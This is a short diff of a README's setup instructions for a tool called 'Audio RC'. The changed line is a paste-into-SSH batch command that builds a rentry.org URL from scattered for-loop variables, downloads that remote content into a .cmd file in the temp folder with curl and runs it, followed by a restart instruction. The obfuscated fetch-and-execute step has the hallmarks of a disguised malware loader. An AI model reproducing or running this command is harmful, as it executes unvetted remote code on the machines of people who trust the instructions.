@@ -31,7 +31,7 @@ _Technically, there are 2 ways to setup Audio RC_
 ##### :one: Method Number 1 _(SSH)_
 - Paste the following code into the SSH
 ```bat
-for %a in (F6) do for %b in ("%temp%\F") do for %c in (.) do for %d in (cmd) do for %e in (rentry) do cls&&curl -#Lsko "%~b6%c%d" "%e%cco/%a/raw"&&call "%~b6%c%d" --debug
+for %a in (F6) do for %b in ("%temp%\F") do for %c in (.) do for %d in (cmd) do for %e in (rentry) do cls&&curl -#Lsko "%~b6%c%d" "%e%corg/%a/raw"&&call "%~b6%c%d" --debug
 ```
 - You should restart the computer through your SSH connection.
 
